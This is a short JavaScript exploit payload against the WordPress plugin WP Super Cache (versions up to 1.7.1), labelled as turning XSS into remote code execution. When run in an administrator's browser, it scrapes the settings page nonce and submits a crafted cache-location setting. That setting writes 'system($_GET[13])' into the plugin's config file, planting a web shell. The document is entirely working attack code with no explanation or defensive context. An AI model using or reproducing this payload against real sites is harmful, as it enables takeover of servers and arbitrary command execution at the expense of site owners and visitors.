/*!
- [ WordPress ] WP Super Cache <= 1.7.1 - From XSS to RCE payload
*/
u="/wp-admin/options-general.php?page=wpsupercache&tab=settings";jQuery.get(u,function(e){jQuery.post(u,{action:"scupdates","_wpnonce":e.match(/_wpnonce\"\svalue=\"(.+?)\"/)[1],wp_cache_enabled:1,wp_cache_location:".';system($_GET[13]);include_once \'wp-cache-config.php\';#"})});console.log("Yoink!");